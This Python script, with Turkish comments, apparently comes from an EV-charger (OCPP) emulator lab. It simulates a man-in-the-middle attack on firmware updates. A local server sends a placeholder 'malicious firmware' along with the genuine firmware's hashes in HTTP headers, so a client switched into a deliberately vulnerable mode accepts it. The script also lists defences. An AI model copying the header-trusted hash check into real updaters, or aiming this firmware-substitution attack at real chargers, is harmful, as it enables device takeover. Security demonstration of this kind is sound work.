"""
OTA Hash Zaafiyeti - MITM (Man-In-The-Middle) Saldırı Senaryosu
================================================================

Bu script, OTA güncellemelerinde MITM saldırısıyla hash değiştirme
zaafiyetini göstermek için tasarlanmıştır.

Saldırı Senaryosu:
1. Saldırgan ağ trafiğini dinler (MITM)
2. Client firmware indirmek için HTTP isteği gönderir
3. Saldırgan HTTP yanıtını yakalar ve değiştirir
4. Saldırgan malicious firmware gönderir
5. Saldırgan HTTP header'da sahte hash gönderir
6. Client header'dan hash alır ve doğrular
7. Sahte hash ile malicious firmware kabul edilir
8. Malicious firmware yüklenir

Bu senaryo, hash'in HTTP header'dan alınması zaafiyetini gösterir.
Güvenli bir sistemde hash, güvenli kanaldan (OCPP mesajı içinde,
imzalı mesaj) gönderilmeli ve doğrulanmalıdır.

Kullanım:
    python charging/scenarios/ota_hash_mitm_attack.py
"""

import sys
sys.path.append('.')

import asyncio
import logging
import http.server
import socketserver
import threading
import os
import hashlib
import time
import websockets
from pathlib import Path
from datetime import datetime

import yaml
CONFIG_FILE = 'charging/server_config.yaml'
VERSION = 'v2.0.1'  # Varsayılan OCPP versiyonu
try:
    with open(CONFIG_FILE, "r") as file: 
        content = yaml.safe_load(file)
        if content and "version" in content:
            VERSION = content["version"]
except (yaml.YAMLError, FileNotFoundError) as e:
    print(f'Failed to parse {CONFIG_FILE}: {e}')
    print(f'Using default version: {VERSION}')

from charging.client import launch_client, ChargePointClientBase

logging.basicConfig(level=logging.ERROR)

# Malicious firmware içeriği
MALICIOUS_FIRMWARE_CONTENT = (
    b"=== MALICIOUS FIRMWARE (MITM ILE YUKLENDI) ===\n"
    b"This firmware was loaded by MITM attack with hash manipulation.\n\n"
    b"MITM Attack Details:\n"
    b"- Hash retrieved from HTTP header (vulnerability!)\n"
    b"- Attacker intercepted HTTP response\n"
    b"- Attacker sent malicious firmware\n"
    b"- Attacker sent fake hash in HTTP header\n"
    b"- Client accepted fake hash as correct hash\n"
    b"- Malicious firmware loaded\n\n"
    b"Backdoor Features:\n"
    b"1. Remote command execution\n"
    b"2. User data exfiltration\n"
    b"3. Charging manipulation\n"
    b"4. Certificate replacement\n\n"
    b"Load Time: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S").encode() + b"\n"
    b"==========================\n"
)

# Normal firmware içeriği (saldırgan bunu değiştirecek)
NORMAL_FIRMWARE_CONTENT = (
    b"=== NORMAL FIRMWARE v1.0.0 ===\n"
    b"This is a normal, secure firmware file.\n"
    b"==========================\n"
)

# Normal firmware'in hash'i
NORMAL_FIRMWARE_MD5 = hashlib.md5(NORMAL_FIRMWARE_CONTENT).hexdigest()

# MITM Handler - HTTP yanıtını yakalar ve değiştirir
class MITMFirmwareHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/firmware.bin' or self.path == '/malicious_firmware.bin':
            print("[*] ⚠️  MITM SALDIRISI: HTTP isteği yakalandı!")
            print("[*] ⚠️  Normal firmware yerine malicious firmware gönderiliyor...")
            print("[*] ⚠️  HTTP header'da sahte hash gönderiliyor...")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-length', str(len(MALICIOUS_FIRMWARE_CONTENT)))
            
            # ZAAFİYET: HTTP header'dan hash alınıyor
            # Saldırgan normal firmware'in hash'ini gönderiyor
            # Ancak malicious firmware gönderiyor
            malicious_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
            
            # MITM Saldırısı: Normal firmware'in hash'ini gönder
            # Client bunu doğru hash olarak kabul edecek
            # Ancak malicious firmware gönderiliyor
            print(f"[*] Normal firmware hash (beklenen): {NORMAL_FIRMWARE_MD5}")
            print(f"[*] Malicious firmware hash (gerçek): {malicious_hash}")
            print(f"[*] ⚠️  Sahte hash gönderiliyor: {NORMAL_FIRMWARE_MD5}")
            
            # Sahte hash gönder (normal firmware'in hash'i)
            self.send_header('X-Firmware-Hash-MD5', NORMAL_FIRMWARE_MD5)
            self.send_header('X-Firmware-Hash-SHA256', hashlib.sha256(NORMAL_FIRMWARE_CONTENT).hexdigest())
            
            self.end_headers()
            # Ancak malicious firmware gönder
            self.wfile.write(MALICIOUS_FIRMWARE_CONTENT)
            
            print(f"[*] 💀 MITM SALDIRISI BAŞARILI!")
            print(f"[*] Malicious firmware gönderildi ({len(MALICIOUS_FIRMWARE_CONTENT)} bytes)")
            print(f"[*] Client sahte hash'i doğru hash olarak kabul edecek!")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

def start_mitm_firmware_server(port=8080):
    """MITM saldırısı yapan firmware server başlat"""
    handler = MITMFirmwareHandler
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[*] ⚠️  MITM Firmware Server başlatıldı: http://localhost:{port}/firmware.bin")
    print(f"[*] Bu server, HTTP yanıtını yakalar ve değiştirir!")
    httpd.serve_forever()

async def send_firmware_update(serial_number, firmware_url, server_ip='127.0.0.1', port=9008):
    """Operator websocket'e bağlan ve UpdateFirmware mesajı gönder"""
    uri = f"ws://{server_ip}:{port}"
    try:
        async with websockets.connect(uri) as websocket:
            command = f"updateFirmware {serial_number} {firmware_url}"
            print(f"[*] Operator websocket'e bağlandı: {uri}")
            print(f"[*] Komut gönderiliyor: {command}")
            await websocket.send(command)
            response = await websocket.recv()
            print(f"[*] Sunucu yanıtı: {response}")
            return True
    except Exception as e:
        print(f"[!] Operator websocket hatası: {e}")
        return False

async def ota_hash_mitm_attack_scenario(cp: ChargePointClientBase):
    """MITM saldırı senaryosu"""
    cp.print_message('=' * 70)
    cp.print_message('OTA HASH ZAAFİYETİ - MITM SALDIRI SENARYOSU')
    cp.print_message('=' * 70)
    cp.print_message('')
    cp.print_message('📋 MITM SALDIRI ADIMLARI:')
    cp.print_message('   1. ✅ Client server\'a bağlandı')
    cp.print_message('   2. ⏳ Saldırgan ağ trafiğini dinliyor (MITM)')
    cp.print_message('   3. ⏳ Client firmware indirmek için HTTP isteği gönderecek')
    cp.print_message('   4. ⏳ Saldırgan HTTP yanıtını yakalayacak')
    cp.print_message('   5. ⏳ Saldırgan malicious firmware gönderecek')
    cp.print_message('   6. ⏳ Saldırgan HTTP header\'da sahte hash gönderecek')
    cp.print_message('   7. ⏳ Client header\'dan hash alacak ve doğrulayacak')
    cp.print_message('   8. ⏳ Client sahte hash\'i doğru hash olarak kabul edecek')
    cp.print_message('   9. ⏳ Malicious firmware yüklenecek')
    cp.print_message('')
    cp.print_message('⚠️  ZAAFİYET:')
    cp.print_message("   - Hash HTTP header\'dan alınıyor (güvensiz kanal!)")
    cp.print_message("   - MITM saldırısıyla header değiştirilebilir")
    cp.print_message("   - Client header\'daki hash'i doğru hash olarak kabul ediyor")
    cp.print_message("   - Sahte hash ile malicious firmware kabul ediliyor")
    cp.print_message('')
    cp.print_message('🛡️  KORUNMA:')
    cp.print_message("   - Hash güvenli kanaldan gönderilmeli (OCPP mesajı içinde)")
    cp.print_message("   - Hash imzalı mesaj içinde gönderilmeli")
    cp.print_message("   - HTTPS/TLS kullanılmalı (ancak yeterli değil!)")
    cp.print_message("   - Digital signature kullanılmalı")
    cp.print_message('')
    cp.print_message('⏳ Firmware güncelleme isteği bekleniyor...')
    cp.print_message('   (Otomatik olarak gönderilecek)')
    
    # Biraz bekle
    await asyncio.sleep(3)
    
    # Otomatik olarak firmware güncelleme isteği gönder
    serial_number = 'E2507-8420-1274'
    firmware_url = 'http://localhost:8080/firmware.bin'
    
    cp.print_message('')
    cp.print_message(f'[*] Firmware güncelleme isteği gönderiliyor...')
    cp.print_message(f'    Serial: {serial_number}')
    cp.print_message(f'    URL: {firmware_url}')
    cp.print_message('')
    cp.print_message('⚠️  MITM SALDIRISI BAŞLAYACAK!')
    cp.print_message('   Saldırgan HTTP yanıtını yakalayacak ve değiştirecek...')
    
    # Operator websocket'e bağlan ve mesaj gönder
    success = await send_firmware_update(serial_number, firmware_url)
    
    if success:
        cp.print_message('[*] Firmware güncelleme isteği gönderildi!')
        cp.print_message('[*] Client firmware\'ı indirecek...')
        cp.print_message('[*] ⚠️  MITM saldırısı gerçekleşecek...')
        cp.print_message('[*] Client sahte hash\'i doğru hash olarak kabul edecek...')
    else:
        cp.print_message('[*] Firmware güncelleme isteği gönderilemedi!')
    
    # Firmware yüklenmesini bekle
    await asyncio.sleep(10)
    
    cp.print_message('')
    cp.print_message('=' * 70)
    cp.print_message('MITM SALDIRI SENARYOSU TAMAMLANDI')
    cp.print_message('=' * 70)

def main():
    """Ana fonksiyon"""
    print("=" * 70)
    print("OTA HASH ZAAFİYETİ - MITM SALDIRI SENARYOSU")
    print("=" * 70)
    print("\n[!] Bu senaryo, MITM saldırısıyla hash değiştirme")
    print("    zaafiyetini göstermek için tasarlanmıştır.\n")
    print("[*] MITM Saldırı Senaryosu:")
    print("    1. Saldırgan ağ trafiğini dinler (MITM)")
    print("    2. Client firmware indirmek için HTTP isteği gönderir")
    print("    3. Saldırgan HTTP yanıtını yakalar ve değiştirir")
    print("    4. Saldırgan malicious firmware gönderir")
    print("    5. Saldırgan HTTP header'da sahte hash gönderir")
    print("    6. Client header'dan hash alır ve doğrular")
    print("    7. Sahte hash ile malicious firmware kabul edilir")
    print("    8. Malicious firmware yüklenir")
    print("\n[⚠️] ZAAFİYET:")
    print("    - Hash HTTP header'dan alınıyor (güvensiz kanal!)")
    print("    - MITM saldırısıyla header değiştirilebilir")
    print("    - Client header'daki hash'i doğru hash olarak kabul ediyor")
    print("\n[🛡️] KORUNMA:")
    print("    - Hash güvenli kanaldan gönderilmeli (OCPP mesajı içinde)")
    print("    - Hash imzalı mesaj içinde gönderilmeli")
    print("    - Digital signature kullanılmalı")
    print("=" * 70)
    print()
    
    # Client'ta zaafiyet modunu ayarla (header_hash modu)
    os.environ['OTA_HASH_VULN_MODE'] = 'header_hash'
    
    # MITM firmware server'ı ayrı thread'de başlat
    firmware_server_thread = threading.Thread(
        target=start_mitm_firmware_server,
        args=(8080,),
        daemon=True
    )
    firmware_server_thread.start()
    
    # Biraz bekle
    time.sleep(2)
    
    # Malicious firmware dosyasını oluştur
    firmware_dir = Path('./charging/firmware_server')
    firmware_dir.mkdir(parents=True, exist_ok=True)
    firmware_path = firmware_dir / 'firmware.bin'
    with open(firmware_path, 'wb') as f:
        f.write(MALICIOUS_FIRMWARE_CONTENT)
    
    # Client config - OCPP 2.0.1 kullanmak için index=0 kullanıyoruz
    # client_config.yaml dosyasındaki profile 0 (OCPP201, SP=1) kullanılacak
    try:
        asyncio.run(launch_client(
            vendor_name='EmuOCPPCharge',
            model='E2507',
            index=0,  # OCPP 2.0.1, Security Profile 1
            async_runnable=ota_hash_mitm_attack_scenario
        ))
    except KeyboardInterrupt:
        print("\n[*] Senaryo sonlandırıldı")

if __name__ == "__main__":
    main()
